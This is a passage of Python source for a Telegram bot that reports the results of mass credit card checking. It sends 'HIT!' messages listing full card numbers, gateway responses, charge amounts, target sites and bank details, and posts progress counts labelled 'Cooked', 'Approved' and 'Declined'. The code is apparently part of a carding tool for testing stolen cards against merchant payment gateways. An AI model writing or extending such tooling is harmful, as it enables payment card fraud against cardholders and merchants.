            bot.send_message(message.chat.id, final_msg, parse_mode='HTML')

    # ============================================================================
    # 📩 MESSAGING
    # ============================================================================
    def send_hit(bot, chat_id, res, title):
        try:
            bin_info = get_bin_info(res['cc'])
            site_name = res['site_url'].replace('https://', '').split('/')[0]
            msg = f"""
┏━━━━━━━⍟
┃ <b>{title} HIT!</b>
┗━━━━━━━━━━━⊛
💳 <b>Card:</b> <code>{res['cc']}</code>
💰 <b>Resp:</b> {res['response']}
💲 <b>Amt:</b> ${res['price']}
🌐 <b>Site:</b> {site_name}
🔌 <b>Gate:</b> {res['gateway']}
🏳️ <b>Info:</b> {bin_info.get('country_flag','')} {bin_info.get('bank','')}
━━━━━━━━━━━━━━━━━━━━
"""
            bot.send_message(chat_id, msg, parse_mode='HTML')
        except: pass

    def update_ui(bot, chat_id, mid, processed, total, results):
        try:
            msg = f"""
┏━━━━━━━⍟
┃ <b>⚡ MASS CHECKING...</b>
┗━━━━━━━━━━━⊛
{create_progress_bar(processed, total)}
<b>Progress:</b> {processed}/{total}
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
⚠️ <b>Errors:</b> {len(results['error'])}
"""
            bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')
        except: pass

    def send_final(bot, chat_id, mid, total, results, duration):
        msg = f"""
┏━━━━━━━⍟
┃ <b>✅ CHECK COMPLETED</b>
┗━━━━━━━━━━━⊛
🔥 <b>Cooked:</b> {len(results['cooked'])}
✅ <b>Approved:</b> {len(results['approved'])}
❌ <b>Declined:</b> {len(results['declined'])}
<b>Total:</b> {total} | <b>Time:</b> {duration:.2f}s
"""
        try: bot.edit_message_text(msg, chat_id, mid, parse_mode='HTML')

        except: bot.send_message(chat_id, msg, parse_mode='HTML')

